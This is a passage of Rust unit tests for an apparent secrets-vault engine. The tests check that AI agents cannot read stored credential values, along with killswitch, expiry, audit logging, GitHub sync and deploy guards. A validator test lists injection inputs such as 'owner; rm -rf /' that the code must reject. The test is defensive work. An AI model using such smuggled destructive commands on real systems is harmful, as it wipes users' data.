        assert_eq!(keys.len(), 3, "unexpected fields: {keys:?}");
    }

    use super::*;
    use crate::policy::{Caller, CallerContext};
    use std::fs as std_fs;
    use std::sync::atomic::{AtomicU64, Ordering};

    const PASSWORD: &str = "test-master-password";

    fn agent_ctx() -> CallerContext {
        CallerContext {
            caller: Caller::Agent,
            agent_name: Some("test-agent".into()),
            session_id: None,
        }
    }

    static TEST_COUNTER: AtomicU64 = AtomicU64::new(0);

    fn temp_dir() -> PathBuf {
        let id = TEST_COUNTER.fetch_add(1, Ordering::SeqCst);
        let d = std::env::temp_dir().join(format!("vaultly-rs-test-{}-{}", std::process::id(), id));
        let _ = std_fs::remove_dir_all(&d);
        std_fs::create_dir_all(&d).unwrap();
        d
    }

    fn setup() -> (VaultEngine, PathBuf) {
        let dir = temp_dir();
        let mut engine = VaultEngine::with_dir(None, dir.clone());
        engine.store.init_vault(PASSWORD).unwrap();
        engine.unlock(PASSWORD).unwrap();
        (engine, dir)
    }

    #[test]
    fn failure_output_detail_combines_both_streams() {
        let detail = failure_output_detail("guard refused: pending migrations", "npm ERR! exit 1");
        assert!(detail.contains("stdout: guard refused: pending migrations"));
        assert!(detail.contains("stderr: npm ERR! exit 1"));
    }

    #[test]
    fn failure_output_detail_skips_empty_streams() {
        assert_eq!(failure_output_detail("", ""), "No output returned");
        assert_eq!(
            failure_output_detail("only stdout", "  \n "),
            "stdout: only stdout"
        );
    }

    #[test]
    fn failure_output_detail_tails_long_output() {
        let long = "x".repeat(FAILURE_OUTPUT_CHARS + 100);
        let detail = failure_output_detail(&long, "");
        assert!(!detail.contains(&"x".repeat(FAILURE_OUTPUT_CHARS + 1)));
        assert!(detail.len() < "stdout: ".len() + FAILURE_OUTPUT_CHARS + 16);
    }

    #[test]
    fn github_sync_rejects_malformed_names() {
        for repo in [
            "",
            "no-slash",
            "/noname",
            "owner/",
            "owner/repo/extra",
            "owner; rm -rf /",
            "owner/repo --repo evil",
            "https://github.com/owner/repo",
        ] {
            assert!(
                VaultEngine::validate_github_repo(repo).is_err(),
                "repo accepted: {repo}"
            );
        }
        for name in [
            "",
            "lowercase",
            "WITH-DASH",
            "WITH SPACE",
            "NAME;",
            "A".repeat(65).as_str(),
        ] {
            assert!(
                VaultEngine::validate_github_secret_name(name).is_err(),
                "secret accepted: {name}"
            );
        }
        assert!(VaultEngine::validate_github_repo("GATE-And-Tech/gate-2027-website").is_ok());
        assert!(VaultEngine::validate_github_secret_name("CLOUDFLARE_API_TOKEN").is_ok());
        for env in ["", "has space", "semi;colon", "a".repeat(101).as_str()] {
            assert!(
                VaultEngine::validate_github_env(env).is_err(),
                "env accepted: {env}"
            );
        }
        assert!(VaultEngine::validate_github_env("production").is_ok());
    }

    #[tokio::test]
    async fn github_sync_copies_value_without_exposing_it() {
        use std::os::unix::fs::PermissionsExt;
        let (mut engine, dir) = setup();
        let fake_value = "gh-sync-fake-cloudflare-token-abcdef123456";
        engine
            .add_secret("cf-test", "CLOUDFLARE_API_TOKEN", fake_value, None)
            .unwrap();
        // Hermetic `gh`: resolves via a prepended PATH entry (original PATH
        // kept, so parallel tests spawning node/npx/sh are unaffected).
        let bindir = dir.join("bin");
        std_fs::create_dir_all(&bindir).unwrap();
        let marker = dir.join("synced-body");
        let argmarker = dir.join("synced-args");
        let argvmarker = dir.join("synced-argv");
        std_fs::write(
            bindir.join("gh"),
            format!(
                "#!/bin/sh\nprintf '%s' \"$VAULTLY_SYNC_BODY\" > '{}'\nprintf '%s|%s' \"$VAULTLY_SYNC_SECRET\" \"$VAULTLY_SYNC_REPO\" > '{}'\nprintf '%s' \"$*\" > '{}'\n",
                marker.display(),
                argmarker.display(),
                argvmarker.display()
            ),
        )
        .unwrap();
        std_fs::set_permissions(bindir.join("gh"), std_fs::Permissions::from_mode(0o755)).unwrap();
        let old_path = std::env::var_os("PATH").unwrap_or_default();
        let mut paths = vec![bindir.into_os_string()];
        paths.extend(std::env::split_paths(&old_path).map(|p| p.into_os_string()));
        std::env::set_var("PATH", std::env::join_paths(paths).unwrap());
        let status = engine
            .sync_github_secret(
                "cf-test",
                "CLOUDFLARE_API_TOKEN",
                "owner/repo",
                "CLOUDFLARE_API_TOKEN",
                None,
                Some(&agent_ctx()),
            )
            .await;
        let status = status.unwrap();
        // Status carries names only.
        assert!(status.contains("owner/repo"));
        assert!(!status.contains(fake_value));
        // Environment-scoped sync passes --env through to gh.
        engine
            .sync_github_secret(
                "cf-test",
                "CLOUDFLARE_API_TOKEN",
                "owner/repo",
                "CLOUDFLARE_API_TOKEN",
                Some("production"),
                Some(&agent_ctx()),
            )
            .await
            .unwrap();
        std::env::set_var("PATH", old_path);
        // The value reached `gh` stdin-equivalent (env body) byte-for-byte.
        assert_eq!(std_fs::read_to_string(&marker).unwrap(), fake_value);
        assert_eq!(
            std_fs::read_to_string(&argmarker).unwrap(),
            "CLOUDFLARE_API_TOKEN|owner/repo"
        );
        let audit = std_fs::read_to_string(engine.store.audit_log_path()).unwrap();
        assert!(audit.contains("GITHUB_SYNC"));
        assert!(!audit.contains(fake_value));
        let argv = std_fs::read_to_string(&argvmarker).unwrap();
        assert!(argv.contains("--env production"), "argv was: {argv}");
    }

    #[tokio::test]
    async fn github_sync_missing_key_reports_names_only() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("cf-test", "OTHER_KEY", "v", None)
            .unwrap();
        let err = engine
            .sync_github_secret(
                "cf-test",
                "NOPE",
                "owner/repo",
                "CLOUDFLARE_API_TOKEN",
                None,
                Some(&agent_ctx()),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("NOPE"));
        assert!(err.contains("cf-test"));
    }

    #[tokio::test]
    async fn engine_meta_reports_expiry_and_timestamps() {
        let (mut engine, _dir) = setup();
        let past = "2020-01-01T00:00:00Z".to_string();
        engine
            .add_secret_with_expiry("github", "OLD", "v", Some(&past), Some(&agent_ctx()))
            .unwrap();
        engine
            .add_secret("github", "FRESH", "v", Some(&agent_ctx()))
            .unwrap();

        let meta = engine
            .secret_meta("github", "OLD", Some(&agent_ctx()))
            .unwrap();
        assert!(meta.expired, "past expiry must report expired=true");
        assert_eq!(meta.expires_at.as_deref(), Some(past.as_str()));
        assert!(!meta.unknown_timestamps);
        assert!(!meta.created_at.is_empty());

        let fresh = engine
            .secret_meta("github", "FRESH", Some(&agent_ctx()))
            .unwrap();
        assert!(!fresh.expired);
        assert!(fresh.expires_at.is_none());

        // list_keys_meta covers both, sorted by key, values never included.
        let all = engine.list_keys_meta("github", Some(&agent_ctx())).unwrap();
        let names: Vec<&str> = all.iter().map(|m| m.key.as_str()).collect();
        assert_eq!(names, vec!["FRESH", "OLD"]);
        assert!(!all[0].expired);
        assert!(all[1].expired);
    }

    #[tokio::test]
    async fn expired_keys_lists_only_expired_secrets_v2() {
        let (mut engine, _dir) = setup();
        let past = "2020-01-01T00:00:00Z".to_string();
        engine
            .add_secret_with_expiry("github", "OLD", "v", Some(&past), Some(&agent_ctx()))
            .unwrap();
        engine
            .add_secret("github", "FRESH", "v", Some(&agent_ctx()))
            .unwrap();
        engine
            .add_secret_with_expiry("github", "GONE", "v", Some(&past), Some(&agent_ctx()))
            .unwrap();

        let expired = engine.expired_keys("github", Some(&agent_ctx())).unwrap();
        assert_eq!(expired, vec!["GONE", "OLD"], "only expired keys, sorted");

        // Rotating (overwriting with a fresh, non-expiring value) clears the
        // expired state for the rotated key.
        let new_value = crate::generate::generate_secret(16, false);
        engine
            .add_secret_with_expiry("github", "OLD", &new_value, None, Some(&agent_ctx()))
            .unwrap();
        let expired = engine.expired_keys("github", Some(&agent_ctx())).unwrap();
        assert_eq!(expired, vec!["GONE"], "rotated key no longer expired");
    }

    #[tokio::test]
    async fn killswitch_blocks_ops_until_unlock() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("g", "K", "v", Some(&agent_ctx()))
            .unwrap();
        engine.kill(Some(&agent_ctx()));
        assert!(!engine.is_unlocked());

        let err = engine.list_keys("g", Some(&agent_ctx())).unwrap_err();
        let s = err.to_string();
        assert!(
            matches!(err, VaultError::Policy(_)),
            "kill must surface as a Policy error, got: {s}"
        );

        // A fresh unlock clears the marker and restores operations.
        engine.unlock(PASSWORD).unwrap();
        assert!(engine.is_unlocked());
        assert!(engine
            .list_keys("g", Some(&agent_ctx()))
            .unwrap()
            .contains(&"K".to_string()));
    }

    #[tokio::test]
    async fn idle_auto_lock_wipes_key_on_next_op() {
        let (mut engine, _dir) = setup();
        assert!(engine.is_unlocked());
        // Tiny auto-lock threshold + artificially aged last-activity.
        engine.auto_lock = Some(std::time::Duration::from_millis(1));
        engine.last_activity = std::time::Instant::now() - std::time::Duration::from_secs(5);

        // The first operation runs the central gate, which auto-locks.
        let _ = engine.list_vaults(Some(&agent_ctx()));
        assert!(!engine.is_unlocked(), "idle auto-lock must wipe the key");
    }

    #[tokio::test]
    async fn lock_requires_unlock_for_operations() {
        let (mut engine, _dir) = setup();
        engine.lock(None);
        assert!(!engine.is_unlocked());
        assert!(engine.list_keys("any", Some(&agent_ctx())).is_err());
        engine.unlock(PASSWORD).unwrap();
        assert!(engine.is_unlocked());
    }

    #[tokio::test]
    async fn validated_deploy_runner_does_not_require_generic_run_permission() {
        let (mut engine, dir) = setup();
        engine
            .add_secret(
                "cf-deploy",
                "CLOUDFLARE_API_TOKEN",
                "deployment-secret",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine.set_agent_policies(vec![crate::policy::AgentPolicy {
            name: "test-agent".into(),
            allowed_vaults: crate::policy::AllowedVaults::List(vec!["cf-deploy".into()]),
            allowed_operations: crate::policy::AllowedOperations::List(vec![
                crate::policy::Operation::Deploy,
            ]),
            roles: Default::default(),
            vault_roles: Default::default(),
            max_ops_per_minute: 60,
            created_at: "2020-01-01T00:00:00Z".into(),
        }]);

        let args = vec![
            "-c".to_string(),
            "printf '%s' \"$CLOUDFLARE_API_TOKEN\"".to_string(),
        ];
        let opts = RunOptions {
            cwd: Some(dir.to_str().unwrap()),
            timeout_ms: Some(30_000),
            allowed_keys: Some(&["CLOUDFLARE_API_TOKEN".to_string()]),
        };

        let generic = engine
            .run("cf-deploy", "sh", &args, &opts, Some(&agent_ctx()))
            .await
            .unwrap_err();
        assert!(generic.to_string().contains("cannot perform 'run'"));

        let deployment = engine
            .run_with_secrets(
                "cf-deploy",
                "sh",
                &args,
                &opts,
                Some(&agent_ctx()),
                "DEPLOY_RUN",
            )
            .await
            .unwrap();
        assert_eq!(deployment.code, 0);
        assert_eq!(deployment.secrets_injected, vec!["CLOUDFLARE_API_TOKEN"]);
        assert!(deployment.scrubbed);
        assert_eq!(deployment.stdout, "[REDACTED]");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn validated_deploy_spawn_handles_signals_and_descendant_pipes() {
        let mut engine = VaultEngine::with_dir(None, temp_dir());
        let signaled = engine
            .spawn(
                "sh",
                &["-c".into(), "kill -TERM $$".into()],
                &[],
                None,
                1000,
            )
            .await
            .unwrap();
        assert_ne!(signaled.code, 0);
        let started = Instant::now();
        let timed_out = engine
            .spawn(
                "sh",
                &["-c".into(), "sleep 30 & wait".into()],
                &[],
                None,
                100,
            )
            .await
            .unwrap();
        assert_eq!(timed_out.code, 124);
        assert!(started.elapsed() < Duration::from_secs(5));
        let exited = engine
            .spawn(
                "sh",
                &["-c".into(), "sleep 30 & exit 0".into()],
                &[],
                None,
                1000,
            )
            .await
            .unwrap();
        assert_eq!(exited.code, 0);
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn validated_deploy_target_enforces_boundary_end_to_end() {
        let (mut engine, _vault_dir) = setup();
        let dir = std::env::current_dir()
            .unwrap()
            .join("target")
            .join(format!(
                "deploy-fixture-{}-{}",
                std::process::id(),
                TEST_COUNTER.fetch_add(1, Ordering::SeqCst)
            ));
        std_fs::create_dir_all(&dir).unwrap();
        let dir = std_fs::canonicalize(dir).unwrap();
        let config = r#"{"name":"test-worker","main":"index.js"}"#;
        std_fs::write(dir.join("wrangler.jsonc"), config).unwrap();
        std_fs::write(dir.join("package.json"), r#"{"scripts":{"build":"node build.cjs","predeploy":"node guard.cjs","deploy":"node deploy.cjs"}}"#).unwrap();
        std_fs::write(dir.join("build.cjs"), r#"
            const fs = require('fs');
            if (process.env.CLOUDFLARE_API_TOKEN || process.env.PRIVATE_KEY || process.env.VAULTLY_MASTER_PASSWORD) process.exit(19);
            fs.writeFileSync('built', 'ok');
            if (fs.existsSync('tamper')) fs.writeFileSync('wrangler.jsonc', '{"name":"wrong-worker","main":"index.js"}');
        "#).unwrap();
        std_fs::write(
            dir.join("guard.cjs"),
            r#"
            const fs = require('fs');
            if (fs.existsSync('refuse')) { console.log('guard-refused-because-refuse-file-present'); process.exit(23); }
            fs.writeFileSync('guarded', 'ok');
        "#,
        )
        .unwrap();
        std_fs::write(dir.join("deploy.cjs"), r#"
            const fs = require('fs');
            if (!fs.existsSync('built') || !fs.existsSync('guarded')) process.exit(25);
            if (process.env.CLOUDFLARE_API_TOKEN !== 'fake-deploy-credential' || process.env.PRIVATE_KEY || process.env.VAULTLY_MASTER_PASSWORD) process.exit(26);
            console.log(process.env.CLOUDFLARE_API_TOKEN);
            console.error(process.env.CLOUDFLARE_API_TOKEN);
            fs.writeFileSync('published', 'ok');
        "#).unwrap();
        for (name, value) in [
            ("CLOUDFLARE_API_TOKEN", "fake-deploy-credential"),
            ("CLOUDFLARE_ACCOUNT_ID", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
            ("PRIVATE_KEY", "fake-unrelated-credential"),
        ] {
            engine.add_secret("cf-test", name, value, None).unwrap();
        }
        let target = DeploymentTarget {
            id: "fixture-worker".into(),
            provider: DeploymentProvider::Worker,
            vault: "cf-test".into(),
            account_id: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            project: "test-worker".into(),
            project_dir: dir.to_string_lossy().into(),
            build_command: "npm run build".into(),
            output_dir: ".".into(),
            branch: None,
            worker_package_deploy: true,
            created_at: "2026-01-01T00:00:00Z".into(),
        };
        engine
            .store
            .save_deployment_targets(std::slice::from_ref(&target))
            .unwrap();
        let ctx = agent_ctx();
        let result = engine.deploy_target(&target, Some(&ctx)).await.unwrap();
        assert_eq!(result.status, "success");
        assert!(dir.join("published").exists());
        let audit = std_fs::read_to_string(engine.store.audit_log_path()).unwrap();
        assert!(audit.contains("DEPLOY_RUN"));
        assert!(!audit.contains("fake-deploy-credential"));
        assert!(!audit.contains("fake-unrelated-credential"));
        assert!(engine
            .run("cf-test", "node", &[], &RunOptions::default(), Some(&ctx))
            .await
            .is_err());

        std_fs::remove_file(dir.join("published")).unwrap();
        std_fs::write(dir.join("refuse"), "1").unwrap();
        let refusal = engine
            .deploy_target(&target, Some(&ctx))
            .await
            .unwrap_err()
            .to_string();
        assert!(refusal.contains("Worker deployment for target"));
        // The guard's stdout refusal reason must reach the agent (no human
        // re-run needed), while injected credential values must never leak.
        assert!(refusal.contains("guard-refused-because-refuse-file-present"));
        assert!(!refusal.contains("fake-deploy-credential"));
        assert!(!refusal.contains("fake-unrelated-credential"));
        assert!(!dir.join("published").exists());
        std_fs::remove_file(dir.join("refuse")).unwrap();

        std_fs::write(dir.join("tamper"), "1").unwrap();
        assert!(engine
            .deploy_target(&target, Some(&ctx))
            .await
            .unwrap_err()
            .to_string()
            .contains("no longer matches"));
        assert!(!dir.join("published").exists());
        std_fs::remove_file(dir.join("tamper")).unwrap();
        std_fs::write(dir.join("wrangler.jsonc"), config).unwrap();

        let mut changed = target.clone();
        changed.project = "wrong-worker".into();
        assert!(engine
            .deploy_target(&changed, Some(&ctx))
            .await
            .unwrap_err()
            .to_string()
            .contains("not registered"));
        engine
            .add_secret(
                "cf-test",
                "CLOUDFLARE_ACCOUNT_ID",
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                None,
            )
            .unwrap();
        assert!(engine
            .deploy_target(&target, Some(&ctx))
            .await
            .unwrap_err()
            .to_string()
            .contains("different Cloudflare account"));
        engine
            .add_secret("cf-test", "CLOUDFLARE_ACCOUNT_ID", &target.account_id, None)
            .unwrap();
        engine
            .add_secret_with_expiry(
                "cf-test",
                "CLOUDFLARE_API_TOKEN",
                "fake-deploy-credential",
                Some("2020-01-01T00:00:00Z"),
                None,
            )
            .unwrap();
        assert!(engine
            .deploy_target(&target, Some(&ctx))
            .await
            .unwrap_err()
            .to_string()
            .contains("expired"));
        assert!(!dir.join("published").exists());

        engine.kill(Some(&ctx));
        assert!(engine
            .deploy_target(&target, Some(&ctx))
            .await
            .unwrap_err()
            .to_string()
            .contains("Killswitch"));
        std_fs::remove_dir_all(&dir).unwrap();
    }

    #[tokio::test]
    async fn add_lists_and_deletes_secrets() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("github", "GITHUB_TOKEN", "ghp_456", Some(&agent_ctx()))
            .unwrap();
        assert_eq!(
            engine.list_vaults(Some(&agent_ctx())).unwrap(),
            vec!["github"]
        );
        assert_eq!(
            engine.list_keys("github", Some(&agent_ctx())).unwrap(),
            vec!["GITHUB_TOKEN"]
        );
        assert!(engine
            .delete_secret("github", "GITHUB_TOKEN", Some(&agent_ctx()))
            .unwrap());
        assert_eq!(
            engine.list_keys("github", Some(&agent_ctx())).unwrap(),
            Vec::<String>::new()
        );
    }

    #[tokio::test]
    async fn agents_cannot_delete_vaults() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("github", "K", "v", Some(&agent_ctx()))
            .unwrap();
        let err = engine
            .delete_vault("github", Some(&agent_ctx()))
            .unwrap_err();
        assert!(err.to_string().contains("Permission denied"));
    }

    #[tokio::test]
    async fn wrong_password_keeps_engine_locked() {
        let dir = temp_dir();
        let mut engine = VaultEngine::with_dir(None, dir);
        engine.store.init_vault(PASSWORD).unwrap();
        let err = engine.unlock("wrong-password").unwrap_err();
        assert!(matches!(err, VaultError::WrongPassword), "got {err}");
        assert!(!engine.is_unlocked());
    }

    #[tokio::test]
    async fn agents_cannot_read_values() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("github", "K", "v", Some(&agent_ctx()))
            .unwrap();
        let err = engine
            .get_secret_value("github", "K", Some(&agent_ctx()))
            .unwrap_err();
        assert!(err.to_string().contains("Permission denied"));
        // Human can
        assert_eq!(engine.get_secret_value("github", "K", None).unwrap(), "v");
    }

    #[tokio::test]
    async fn audit_logs_structured_entries() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("github", "K", "SECRET-VALUE-9", Some(&agent_ctx()))
            .unwrap();
        let log = engine.get_audit_log(50);
        let joined = log.join("\n");
        assert!(joined.contains("\"action\":\"ADD\""));
        assert!(joined.contains("\"action\":\"UNLOCK\""));
        assert!(!joined.contains("SECRET-VALUE-9"));
        assert!(joined.contains("\"agent\":\"test-agent\""));
    }

    #[tokio::test]
    async fn kill_locks_and_audits() {
        let (mut engine, _dir) = setup();
        engine.kill(None);
        assert!(!engine.is_unlocked());
        let joined = engine.get_audit_log(50).join("\n");
        assert!(joined.contains("\"action\":\"KILL\""));
    }

    #[tokio::test]
    async fn concurrent_writes_are_serialized_without_loss() {
        let dir = temp_dir();
        {
            let engine = VaultEngine::with_dir(None, dir.clone());
            engine.store.init_vault(PASSWORD).unwrap();
        }
        let mut handles = Vec::new();
        for i in 0..8 {
            let dir = dir.clone();
            handles.push(tokio::spawn(async move {
                let mut engine = VaultEngine::with_dir(None, dir);
                engine.unlock(PASSWORD).unwrap();
                engine
                    .add_secret("cv", &format!("K{i}"), &format!("v{i}"), Some(&agent_ctx()))
                    .unwrap();
            }));
        }
        for h in handles {
            h.await.unwrap();
        }
        let mut engine = VaultEngine::with_dir(None, dir.clone());
        engine.unlock(PASSWORD).unwrap();
        let keys = engine.list_keys("cv", Some(&agent_ctx())).unwrap();
        for i in 0..8 {
            assert!(
                keys.contains(&format!("K{i}")),
                "missing K{i} — write lost under concurrency; keys={keys:?}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn engine_audit_lines_are_chained_and_verifiable() {
        let (mut engine, dir) = setup();
        engine
            .add_secret("g", "K", "v", Some(&agent_ctx()))
            .unwrap();
        engine.list_keys("g", Some(&agent_ctx())).unwrap();
        let all = engine.get_audit_log(100);
        assert!(
            all.len() >= 3,
            "expected several audit entries, got {}",
            all.len()
        );
        for line in &all {
            let v: serde_json::Value = serde_json::from_str(line).unwrap();
            assert!(
                v.get("prevHash").and_then(|s| s.as_str()).is_some(),
                "engine audit entry missing prevHash: {line}"
            );
        }
        assert!(
            engine.store().verify_audit_chain().unwrap().is_empty(),
            "engine-written audit chain must verify clean"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn lock_blocks_operations_until_unlock() {
        let (mut engine, _dir) = setup();
        engine
            .add_secret("g", "K", "v", Some(&agent_ctx()))
            .unwrap();
        engine.lock(None);
        assert!(!engine.is_unlocked());
        let err = engine.list_keys("g", Some(&agent_ctx())).unwrap_err();
        assert!(
            err.to_string().contains("lock"),
            "expected locked error, got: {err}"
        );
        // Re-unlocking restores access.
        engine.unlock(PASSWORD).unwrap();
        assert!(engine.is_unlocked());
        let keys = engine.list_keys("g", Some(&agent_ctx())).unwrap();
        assert!(keys.contains(&"K".to_string()));
    }

    #[tokio::test]
    async fn ttl_expiry_wipes_key_from_memory() {
        let (mut engine, _dir) = setup();
        engine.session_ttl = Duration::from_millis(50);
        engine
            .add_secret("g", "K", "v", Some(&agent_ctx()))
            .unwrap();
        tokio::time::sleep(Duration::from_millis(80)).await;
        let err = engine.list_keys("g", Some(&agent_ctx())).unwrap_err();
        assert!(err.to_string().contains("expired"), "{}", err);
        assert!(engine.key.is_none(), "key must be zeroed on TTL expiry");
    }

    // ─── Cloudflare auth modes (ported from test/cf.test.ts) ──

    #[derive(Debug)]
    struct CapturedRequest {
        method: String,
        path: String,
        headers: Vec<(String, String)>,
        body: String,
    }

    impl CapturedRequest {
        fn header(&self, name: &str) -> Option<&str> {
            self.headers
                .iter()
                .find(|(k, _)| k.eq_ignore_ascii_case(name))
                .map(|(_, v)| v.as_str())
        }
    }

    /// Local HTTP server that captures one request and answers with canned JSON.
    async fn spawn_cf_server(
        resp_json: &str,
    ) -> (
        String,
        std::sync::Arc<std::sync::Mutex<Vec<CapturedRequest>>>,
    ) {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let requests: std::sync::Arc<std::sync::Mutex<Vec<CapturedRequest>>> =
            std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
        let resp_body = resp_json.to_string();
        let reqs = requests.clone();
        tokio::spawn(async move {
            loop {
                let (mut sock, _) = match listener.accept().await {
                    Ok(s) => s,
                    Err(_) => break,
                };
                let reqs = reqs.clone();
                let resp_body = resp_body.clone();
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut tmp = [0u8; 2048];
                    let header_end = loop {
                        match sock.read(&mut tmp).await {
                            Ok(0) | Err(_) => break None,
                            Ok(n) => {
                                buf.extend_from_slice(&tmp[..n]);
                                if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                                    break Some(i);
                                }
                            }
                        }
                    };
                    let Some(end) = header_end else { return };
                    let head = String::from_utf8_lossy(&buf[..end]).to_string();
                    let mut lines = head.lines();
                    let req_line = lines.next().unwrap_or("").to_string();
                    let mut headers = Vec::new();
                    let mut content_length = 0usize;
                    for l in lines {
                        if let Some((k, v)) = l.split_once(':') {
                            let k = k.trim().to_string();
                            let v = v.trim().to_string();
                            if k.eq_ignore_ascii_case("content-length") {
                                content_length = v.parse().unwrap_or(0);
                            }
                            headers.push((k, v));
                        }
                    }
                    while buf.len() < end + 4 + content_length {
                        match sock.read(&mut tmp).await {
                            Ok(0) | Err(_) => break,
                            Ok(n) => buf.extend_from_slice(&tmp[..n]),
                        }
                    }
                    let body = String::from_utf8_lossy(&buf[end + 4..end + 4 + content_length])
                        .to_string();
                    let parts: Vec<&str> = req_line.split_whitespace().collect();
                    reqs.lock().unwrap().push(CapturedRequest {
                        method: parts.first().unwrap_or(&"").to_string(),
                        path: parts.get(1).unwrap_or(&"").to_string(),
                        headers,
                        body,
                    });
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                        resp_body.len(),
                        resp_body
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                });
            }
        });
        (format!("http://{}", addr), requests)
    }

    #[derive(Clone, Copy)]
    struct MockRoute {
        method: &'static str,
        path_prefix: &'static str,
        status: u16,
        body: &'static str,
    }

    /// Route-aware variant of the canned server: matches (method, path
    /// prefix) in order, answering 404 JSON when nothing matches.
    async fn spawn_cf_router(
        routes: Vec<MockRoute>,
    ) -> (
        String,
        std::sync::Arc<std::sync::Mutex<Vec<CapturedRequest>>>,
    ) {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let requests: std::sync::Arc<std::sync::Mutex<Vec<CapturedRequest>>> =
            std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
        let reqs = requests.clone();
        tokio::spawn(async move {
            loop {
                let (mut sock, _) = match listener.accept().await {
                    Ok(s) => s,
                    Err(_) => break,
                };
                let reqs = reqs.clone();
                let routes = routes.clone();
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut tmp = [0u8; 2048];
                    let header_end = loop {
                        match sock.read(&mut tmp).await {
                            Ok(0) | Err(_) => break None,
                            Ok(n) => {
                                buf.extend_from_slice(&tmp[..n]);
                                if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                                    break Some(i);
                                }
                            }
                        }
                    };
                    let Some(end) = header_end else { return };
                    let head = String::from_utf8_lossy(&buf[..end]).to_string();
                    let mut lines = head.lines();
                    let req_line = lines.next().unwrap_or("").to_string();
                    let mut headers = Vec::new();
                    let mut content_length = 0usize;
                    for l in lines {
                        if let Some((k, v)) = l.split_once(':') {
                            let k = k.trim().to_string();
                            let v = v.trim().to_string();
                            if k.eq_ignore_ascii_case("content-length") {
                                content_length = v.parse().unwrap_or(0);
                            }
                            headers.push((k, v));
                        }
                    }
                    while buf.len() < end + 4 + content_length {
                        match sock.read(&mut tmp).await {
                            Ok(0) | Err(_) => break,
                            Ok(n) => buf.extend_from_slice(&tmp[..n]),
                        }
                    }
                    let body = String::from_utf8_lossy(&buf[end + 4..end + 4 + content_length])
                        .to_string();
                    let parts: Vec<&str> = req_line.split_whitespace().collect();
                    let method = parts.first().unwrap_or(&"").to_string();
                    let path = parts.get(1).unwrap_or(&"").to_string();
                    let (status, resp_body) = routes
                        .iter()
                        .find(|r| method == r.method && path.starts_with(r.path_prefix))
                        .map(|r| (r.status, r.body))
                        .unwrap_or((
                            404,
                            r#"{"success":false,"errors":[{"code":7003,"message":"not found"}]}"#,
                        ));
                    reqs.lock().unwrap().push(CapturedRequest {
                        method,
                        path,
                        headers,
                        body,
                    });
                    let reason = match status {
                        200 => "OK",
                        201 => "Created",
                        400 => "Bad Request",
                        404 => "Not Found",
                        _ => "OK",
                    };
                    let resp = format!(
                        "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                        resp_body.len(),
                        resp_body
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                });
            }
        });
        (format!("http://{}", addr), requests)
    }

    fn cf_setup() -> (VaultEngine, PathBuf) {
        let (mut engine, dir) = setup();
        engine
            .add_secret("cf", "CLOUDFLARE_ACCOUNT_ID", "acc-123", Some(&agent_ctx()))
            .unwrap();
        (engine, dir)
    }
    #[tokio::test]
    async fn engine_cf_accounts_detects_auth_methods_without_values() {
        let (mut engine, _dir) = setup();
        // token-based account
        engine
            .add_secret(
                "cf-personal",
                "CLOUDFLARE_API_TOKEN",
                "tok-secret-1",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf-personal",
                "CLOUDFLARE_ACCOUNT_ID",
                "acc-1",
                Some(&agent_ctx()),
            )
            .unwrap();
        // email+key based account, no account id
        engine
            .add_secret(
                "cf-work",
                "CLOUDFLARE_EMAIL",
                "admin@example.com",
                Some(&agent_ctx()),
            )
            .unwrap();
        engine
            .add_secret(
                "cf-work",
                "CLOUDFLARE_API_KEY",
                "key-secret-2",
                Some(&agent_ctx()),
            )
            .unwrap();
        // non-CF vault must be excluded
        engine
            .add_secret("github", "GITHUB_TOKEN", "ghp-3", Some(&agent_ctx()))
            .unwrap();

        let accounts = engine.list_cf_accounts(Some(&agent_ctx())).unwrap();
        assert_eq!(accounts.len(), 2);
        let personal = accounts.iter().find(|a| a.vault == "cf-personal").unwrap();
        assert_eq!(personal.auth, "token");
        assert!(personal.has_account_id);
        let work = accounts.iter().find(|a| a.vault == "cf-work").unwrap();
        assert_eq!(work.auth, "email+key");
        assert!(!work.has_account_id);
        // serialized output must never contain a secret value
        let ser = serde_json::to_string(&accounts).unwrap();
        assert!(!ser.contains("tok-secret-1"));
        assert!(!ser.contains("key-secret-2"));
        assert!(!ser.contains("ghp-3"));

        // Default agent policy permits cf-api + deploy on every account.
        assert!(personal.cf_api && personal.deploy);
        assert!(work.cf_api && work.deploy);

        // Set a label; it must surface and survive a subsequent write.
        engine
            .set_account_label("cf-personal", Some("Personal"), Some(&agent_ctx()))
            .unwrap();
        engine
            .add_secret("cf-personal", "EXTRA", "v", Some(&agent_ctx()))
            .unwrap();
        let accounts = engine.list_cf_accounts(Some(&agent_ctx())).unwrap();
